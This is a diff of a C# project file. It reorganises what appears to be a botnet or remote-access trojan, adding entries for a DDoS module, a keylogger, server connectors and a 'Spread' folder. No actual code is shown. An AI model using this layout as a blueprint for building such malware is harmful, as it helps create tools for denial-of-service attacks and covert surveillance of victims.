@@ -42,17 +42,23 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="DDos.cs" />
+    <Compile Include="tests\AsyncClient.cs" />
+    <Compile Include="tests\AsyncConnector.cs" />
+    <Compile Include="tools\offensive\DDos.cs" />
     <Compile Include="Executor.cs" />
     <Compile Include="Initialization.cs" />
     <Compile Include="ProtocolController.cs" />
     <Compile Include="ServerConnectors.cs" />
-    <Compile Include="serverSlave.cs" />
+    <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
-    <Compile Include="Tools.cs" />
+    <Compile Include="tools\information gathering\KeyLogger.cs" />
+    <Compile Include="tools\information gathering\Tools.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="Spread\" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
